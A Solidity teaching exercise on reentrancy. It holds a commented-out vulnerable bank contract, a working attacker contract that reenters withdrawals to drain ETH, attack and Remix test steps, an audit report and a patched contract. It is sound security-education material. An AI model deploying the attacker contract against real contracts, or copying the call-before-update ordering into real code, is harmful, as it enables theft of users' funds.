// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Call malicious contract
CONCEPT: Attack surface
=========================================================

OBJECTIVE

- Learn dangers of external contract calls
- Understand malicious-contract behavior
- Learn reentrancy attack surface
- Think like attacker + auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

Every external contract call is:
UNTRUSTED EXECUTION.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

When your contract calls another contract:

CONTROL temporarily leaves your contract.

---------------------------------------------------------

The called contract may:
- revert
- reenter
- consume gas
- manipulate logic
- attack state assumptions

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Most major Solidity hacks involve:

external contract interactions.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls occur in:

- ERC20 interactions
- swaps
- lending
- bridges
- staking
- governance execution

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- reentrancy windows
- trust assumptions
- call ordering
- arbitrary external execution
- unchecked return values

=========================================================
VICTIM CONTRACT
=========================================================
*/
/*
contract VictimBank {

    /*
        USER BALANCES
    
    mapping(address => uint256) public balances;

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    

    function deposit()
        external
        payable
    {

        balances[msg.sender] += msg.value;
    }

    /*
    =====================================================
    SAFE WITHDRAW
    =====================================================
    

    function safeWithdraw(
        uint256 _amount
    )
        external
    {

        /*
            CHECK
        
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            EFFECTS:
            Update storage FIRST.
        
        balances[msg.sender] -= _amount;

        /*
            INTERACTION:
            External ETH transfer LAST.
        
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    External call BEFORE state update.
    

    function vulnerableWithdraw(
        uint256 _amount
    )
        external
    {

        /*
            Validate balance.
        
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            DANGEROUS:
            External call FIRST.
        
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        /*
            STATE UPDATED TOO LATE.
        
        balances[msg.sender] -= _amount;
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
MALICIOUS ATTACKER CONTRACT
=========================================================


contract MaliciousAttacker {

    /*
        TARGET VICTIM CONTRACT
    
    VictimBank public victim;

    /*
        TRACK ATTACK COUNT
    
    uint256 public attackCounter;

    /*
        OWNER
    
    address public owner;

    /*
        ATTACK LIMIT
    
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    
    constructor(address _victim)
    {

        victim = VictimBank(_victim);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO VICTIM
    =====================================================
    

    function depositToVictim()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        
        victim.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    

    function attack()
        external
    {

        /*
            Trigger vulnerable withdraw.
        
        victim.vulnerableWithdraw(
            1 ether
        );
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Executes automatically
    when victim sends ETH.
    

    receive()
        external
        payable
    {

        /*
            Reentrancy trigger.
        
        if (
            address(victim).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            attackCounter++;

            /*
                REENTER victim contract.

                Balance NOT reduced yet.
            
            victim.vulnerableWithdraw(
                1 ether
            );
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }
}
*/
/*
=========================================================
ATTACK FLOW
=========================================================

STEP 1:
Deploy VictimBank

---------------------------------------------------------

STEP 2:
Fund VictimBank with ETH

=========================================================
STEP 3
=========================================================

Deploy MaliciousAttacker

Constructor input:
VictimBank address

=========================================================
STEP 4
=========================================================

Call:
depositToVictim()

VALUE:
1 ETH

---------------------------------------------------------

Attacker now has:
1 ETH balance in victim.

=========================================================
STEP 5
=========================================================

Call:
attack()

---------------------------------------------------------

Execution enters:

victim.vulnerableWithdraw()

=========================================================
CRITICAL VULNERABILITY
=========================================================

Victim executes:

call{value: 1 ether}()

BEFORE reducing balance.

---------------------------------------------------------

CONTROL transfers to:
MaliciousAttacker.receive()

=========================================================
INSIDE ATTACKER receive()
=========================================================

receive() executes automatically.

---------------------------------------------------------

Attacker checks:

victim still has ETH?

---------------------------------------------------------

YES

---------------------------------------------------------

Attacker REENTERS:

victim.vulnerableWithdraw()

=========================================================
IMPORTANT
=========================================================

Victim storage NOT updated yet.

---------------------------------------------------------

balances[attacker]
still unchanged.

---------------------------------------------------------

Attacker withdraws repeatedly.

=========================================================
FINAL RESULT
=========================================================

Attacker drains victim ETH.

=========================================================
WHY THIS HAPPENS
=========================================================

BAD ORDER:

interaction BEFORE effects.

---------------------------------------------------------

Classic reentrancy vulnerability.

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy VictimBank

---------------------------------------------------------

STEP 2:
Deposit multiple ETH into victim

---------------------------------------------------------

STEP 3:
Deploy MaliciousAttacker

Input:
VictimBank address

---------------------------------------------------------

STEP 4:
Call:
depositToVictim()

VALUE:
1 ETH

---------------------------------------------------------

STEP 5:
Call:
attack()

---------------------------------------------------------

STEP 6:
Observe:

Victim ETH decreases heavily.

---------------------------------------------------------

STEP 7:
Call:
attackCounter()

EXPECTED:
Multiple attack rounds

=========================================================
IMPORTANT SECURITY CONCEPT
=========================================================

External contracts are:
UNTRUSTED.

---------------------------------------------------------

Never assume:
called contracts behave safely.

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. REENTRANCY
---------------------------------------------------------

Most famous Solidity vulnerability.

---------------------------------------------------------
2. ARBITRARY EXECUTION
---------------------------------------------------------

External contracts control execution flow.

---------------------------------------------------------
3. DOS VIA REVERT
---------------------------------------------------------

Malicious contract may always revert.

---------------------------------------------------------
4. GAS GRIEFING
---------------------------------------------------------

Malicious contract consumes excessive gas.

=========================================================
CHECKS-EFFECTS-INTERACTIONS
=========================================================

SAFE PATTERN:

1. CHECKS
2. EFFECTS
3. INTERACTIONS

---------------------------------------------------------

safeWithdraw() follows this correctly.

=========================================================
VERY IMPORTANT AUDITOR MINDSET
=========================================================

Auditors NEVER trust:
external contracts.

---------------------------------------------------------

Every external interaction =
potential attack surface.

=========================================================
ATTACK THINKING
=========================================================

Attackers search for:

- external calls
- state updates after calls
- reentrancy windows
- unchecked return values

---------------------------------------------------------

Then:
build malicious contracts to exploit.

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. External interaction timing
2. Storage update order
3. Reentrancy possibilities
4. ETH transfer behavior
5. Cross-contract execution flow

=========================================================
MINI CHALLENGE
=========================================================

Modify VictimBank so that:

1. Add nonReentrant modifier
2. Block reentrancy attack
3. Add event logging
4. Compare safe vs vulnerable execution

BONUS:
Create ERC20-style malicious token attack.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External contracts are untrusted
- call() transfers execution control
- Reentrancy exploits bad ordering
- receive()/fallback() can attack automatically
- CEI pattern improves security
- External calls create attack surface
- Malicious contracts manipulate execution flow
- Auditors inspect every external interaction
- Reentrancy is one of Solidity's biggest risks
- Cross-contract execution is security critical

=========================================================
*/
/*
Audit Report
Title:
Reentrancy Vulnerability in vulnerableWithdraw()

Severity: Critical

Location:
Contract:
VictimBank
Function:
vulnerableWithdraw(uint256 _amount)
Vulnerability Description:
The vulnerableWithdraw() function performs an external ETH transfer before updating internal balances.

This violates the CEI (Checks-Effects-Interactions) pattern and allows attackers to recursively call the function before state updates occur.

A malicious contract can exploit this behavior through its receive() function and repeatedly withdraw ETH from the contract.

Impact:
An attacker can:

drain ETH from the contract
bypass balance accounting
recursively re-enter withdrawal logic
steal funds from other users

This vulnerability can result in total protocol fund loss.

Root Cause:
The contract performs:
external interaction
THEN state update

Vulnerable logic:
(bool success, ) =
    payable(msg.sender).call{
        value: _amount
    }("");

require(success, "Transfer failed");

balances[msg.sender] -= _amount;
Recommendation:

Implement:
nonReentrant modifier
CEI pattern
safe state update ordering
event logging
withdrawal comparison tracking

Patched code
*/
contract VictimBank {

    /*
    =====================================================
    STORAGE
    =====================================================
    */

    mapping(address => uint256) public balances;

    /*
        Reentrancy lock.
    */
    bool private locked;

    /*
        Execution counters.
    */
    uint256 public safeWithdrawCounter;

    uint256 public vulnerableWithdrawCounter;

    /*
    =====================================================
    EVENTS
    =====================================================
    */

    event Deposit(
        address indexed user,
        uint256 amount
    );

    event Withdraw(
        address indexed user,
        uint256 amount,
        string method
    );

    event ReentrancyBlocked(
        address indexed attacker
    );

    /*
    =====================================================
    NON-REENTRANT MODIFIER
    =====================================================
    */

    modifier nonReentrant() {

        require(
            !locked,
            "Reentrancy detected"
        );

        locked = true;

        _;

        locked = false;
    }

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        require(
            msg.value > 0,
            "Must send ETH"
        );

        balances[msg.sender] += msg.value;

        emit Deposit(
            msg.sender,
            msg.value
        );
    }

    /*
    =====================================================
    SAFE WITHDRAW
    =====================================================
    */

    function safeWithdraw(
        uint256 _amount
    )
        external
        nonReentrant
    {

        /*
            CHECKS
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            EFFECTS
        */
        balances[msg.sender] -= _amount;

        safeWithdrawCounter++;

        /*
            INTERACTION
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        emit Withdraw(
            msg.sender,
            _amount,
            "safeWithdraw"
        );
    }

    /*
    =====================================================
    PATCHED VULNERABLE WITHDRAW
    =====================================================
    */

    function vulnerableWithdraw(
        uint256 _amount
    )
        external
        nonReentrant
    {

        /*
            CHECKS
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            EFFECTS FIRST
            (FIXED)
        */
        balances[msg.sender] -= _amount;

        vulnerableWithdrawCounter++;

        /*
            INTERACTION LAST
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        emit Withdraw(
            msg.sender,
            _amount,
            "patchedWithdraw"
        );
    }

    /*
    =====================================================
    COMPARE EXECUTIONS
    =====================================================
    */

    function compareExecutions()
        external
        view
        returns (
            uint256 safeExecutions,
            uint256 patchedExecutions
        )
    {

        return (
            safeWithdrawCounter,
            vulnerableWithdrawCounter
        );
    }

    /*
    =====================================================
    CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}
